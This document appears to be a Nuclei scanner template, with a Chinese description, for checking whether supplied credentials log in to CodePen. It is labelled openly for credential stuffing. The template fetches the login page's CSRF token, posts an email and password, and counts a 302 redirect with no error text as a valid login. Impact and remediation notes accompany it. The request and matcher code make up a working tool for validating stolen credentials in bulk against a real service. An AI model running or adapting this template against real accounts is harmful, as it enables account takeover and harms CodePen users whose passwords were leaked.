id: codepen-login-check

info:
  name: CodePen 登录有效性检查（撞库）
  author: parthmalhotra,pdresearch
  severity: critical
  description: CodePen 是面向前端开发者的在线代码创作、展示和协作平台，账号中可能包含私有作品、团队项目和个人资料。该模板会先获取 CodePen 登录页中的 CSRF 令牌，再提交邮箱和密码，并结合 302 跳转及未出现用户名或密码错误提示来判断给定凭据是否可成功登录，适用于撞库场景下的账号有效性验证。
  impact: |-
    - 攻击者可使用有效凭据登录 CodePen，查看或修改私有 Pen、项目、团队资源和个人资料。
    - 若账号用于公开作品或团队协作，可能导致代码被篡改、恶意内容发布或品牌信誉受损。
    - 成功撞库会暴露用户密码复用问题，并可能被用于继续尝试其他开发者平台账号。
  remediation: |-
    - 重置受影响账号密码，撤销异常会话，并检查近期作品、团队成员和账户设置变更。
    - 启用多因素认证，要求用户为 CodePen 使用唯一强密码。
    - 对登录流程增加速率限制、异常 IP 检测和凭据填充防护，降低自动化撞库成功率。
    - 监测泄露密码库命中情况，对高风险账号触发强制改密或额外验证。
  reference:
    - https://owasp.org/www-community/attacks/Credential_stuffing
  metadata:
    max-request: 2
  tags: creds-stuffing,login-check,cloud,codepen,vuln

self-contained: true

flow: |
  if (template["username"] && template["password"]) {
    http();
  }

http:
  - raw:
      - |
        GET https://codepen.io/login HTTP/1.1
        Host: codepen.io
      - |
        POST https://codepen.io/login/login HTTP/1.1
        Host: codepen.io
        Content-Type: application/x-www-form-urlencoded
        X-CSRF-Token: {{token}}

        authenticity_token={{token}}&email={{username}}&password={{password}}&login-type=fullpage

    extractors:
      - type: dsl
        dsl:
          - username
          - password

      - type: xpath
        part: body
        xpath:
          - '//input[@name="authenticity_token"]/@value'
        name: token
        internal: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        negative: true
        words:
          - 'The username or password you entered is incorrect, please try again.'

      - type: status
        status:
          - 302
